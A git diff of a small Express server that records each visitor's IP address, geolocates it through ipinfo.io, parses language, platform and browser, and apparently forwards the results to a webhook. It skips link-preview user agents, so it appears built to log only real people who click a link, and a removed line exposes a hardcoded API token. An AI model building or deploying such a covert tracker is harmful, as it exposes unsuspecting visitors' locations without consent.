@@ -1,18 +1,19 @@
-const express = require("express");
-const fetch = require("isomorphic-fetch");
-const app = express();
-const port = process.env.port || 3000;
 const unwantedUserAgents = ["Vercelbot/0.1 (+https://vercel.com/)", "got (https://github.com/sindresorhus/got)"];
+const fetch = require("isomorphic-fetch");
+const express = require("express");
+const app = express();
 
 const { sendWebhook } = require("./webhook");
 const channelID = process.env.channel_id;
+const ip_token = process.env.ip_token;
+const port = process.env.port || 3000;
 
 app.get("/", async (req, res) => {
   const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
   const isUnwantedUserAgent = unwantedUserAgents.some(unwantedUserAgent => userAgent.includes(unwantedUserAgent));
   if (isUnwantedUserAgent) { res.status(200).send("Skipping unwanted User Agent"); return; }
-  const { region, city, country, postal } = await (await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`)).json();
+  const { region, city, country, postal } = await (await fetch(`https://ipinfo.io/${ipAddress}?token=${ip_token}`)).json();
   const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
   const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
   const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
